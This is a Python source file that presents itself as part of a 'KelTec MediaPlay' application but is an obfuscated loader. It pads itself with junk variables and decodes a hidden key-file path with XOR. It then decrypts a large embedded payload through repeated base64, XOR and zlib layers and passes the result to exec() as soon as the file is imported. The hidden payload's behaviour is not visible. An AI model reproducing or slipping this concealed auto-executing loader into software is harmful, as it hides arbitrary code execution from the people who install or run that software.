# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 992235 ^ 670734
_lx1_1 = len("fa4a0d")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-968242)
_lx3_3 = 913258 * 0
_lx4_4 = 943560 ^ 188819
_M = '5CF2bXzCr0ArrS7lvoWshG02q5NqN/IcgqfZSimdF8rvZn57fMCsQCL+d7S5iKvfO2yukT80oB2BpI9MeJAQyLpmLX98w6JEJPxx'
_D = 'G1ECIXNn+kD0JsGjNmHTkotJpL/Zbl2WbkqisFhs6HxAYyBMNW1kBsV3Yq0Eolv2GYctsaWC7ljKaLz8SvN81hnrRFvVqTH9wlsfHDqKGsscSX1mvjNejOUFINe/a1T5ZM7UmZ6MfaYz/o4ulAwJrKTMCxx8TalY93WNdex0LF+gtXrJjiPV7sC5kLRTWnD7hmTPKqaOgyoV7ZsxUABCqrT8hPKEQtISfGgcCt0ItxCO4fKOPGb3hwBF1rg1wf5Ow/R07/Ac3yeFI3TokE8imacUEwESV1cmbG38XM4jDyUDknwnlxNmxv9dBJig2bYRraGWpKsOpvBV4aeT50Y1+GfUIJ0m3hJVl6vH9XyUs2HsbsvUmC7a3OKfZ3awpS9ESRYhRgekFlI+zOTCcoYPQ3NpCbrRM1MI46pX2lwRRGcJP9WSrV0vFKUSDmlU5BpZMfrIPbVbb8Iwz/byK+6LlDQOJdBWXVRZuL5iLtGyGZCZ3uN7bfbxi6J/LKBvvT/ROopPKwl+GBPZnBgWpm3f0/BN5yFH4a071emT8ZC9WcVqomnyd/nQV/AreC+vCotNP0qoKyfkzQbblan4ovzpwxQX/blJrwjxGOHAJ0VB+/wuJ3W+MG4dRHNwgD7eA8Q3Dz5d0ocH/yxXPHxFur6oaQNJ6ovLVFIf1dbiO+WUNOHlEoFk5qtxOB/9c9r2YsvOssT4kEUTwL88BjXRDYhfv3Fci8NXXDLyrJ2V6XXCuf/5qhZHVe5mTBpOJRw/OY6vW8BQXJJJe6aIBqCJbWH/tP7PMoC4PyI/Dx/Zm3B+ZbGQySqficb8aR3XQyjPFhngPwuffAqyMiCz5OsUHv4d9Rej26MHYxs/SzuM7O+F19oSp9jqV1Hc40Ew9HBSZiWSgpOjmJFzX89ximaluKzCmzL0WuXOSbuWSq5LrLpJdJ39w6UjOV4WKSPktsDSikxFsHEIfmaZbVqQQJTD9Wcv9N0bGx7KlkuYsip5IKDW630rjIdKiVxIYMS2GMRcGwJx8UwWLQclIz4M7HJg1YpLy+VEfprgh/RQr0D9iN0MbHXo4OJQOqlkGLvqmJKByq+WRfe9IprGgsl0npqcuMO7oTaiHPPAtBgU33h5c31viI3GD0hikZcJbKoucMW6XRdaGI8Sxe/HKH5mVCX1Ch9LHW+qRYt7WRGm8gp4fMeXu8hjPXbyjORMd5cWEr8euemVx891cy0lIG8MidWuh5kczdciz8rsrDdlPK/FqpTk7RNEwk3T40DwHYGX7OKy7dGMBrbTzj/QZGN1FkdkvtFc62l75k8dr+qr0VcaX6JjPJ6AP8tDfByXKMZKWzO/RviV7oD2JjrdHkl491jd441fc1tBicpHieiTLNkpKKezNQwz4xmuUleW3KQl4/5pK6r742nrujFLVST2FuuAzGG6c91anao47+IqJNY2Pqfq6HJ6qmc4RlDMxZslhykbzhFsCmlaiadTFDEF4Rf9Vstq9T7QulanE3nhUH96kpTLTCvySG6Tctq1w7cZj78nAJd97voVLYlE'

_c4ef=[119,91,238,83,223,31,98,253]+[40,159,147,25,231,29,92,26]
_ad70=[200,62,55,13,16,43,108,118]+[138,174,101,72,109,37,168,220]
_c519=bytes([a^b for a,b in zip([5,62,157,60,170,109,1,152,91,176,247,120,147,124],_c4ef*8)]).decode()
_b90a=bytes([a^b for a,b in zip([171,95,84,101,117,5,8,23,254],_ad70*8)]).decode()
_98e5=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_c519.split('/'),_b90a)
with open(_98e5,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()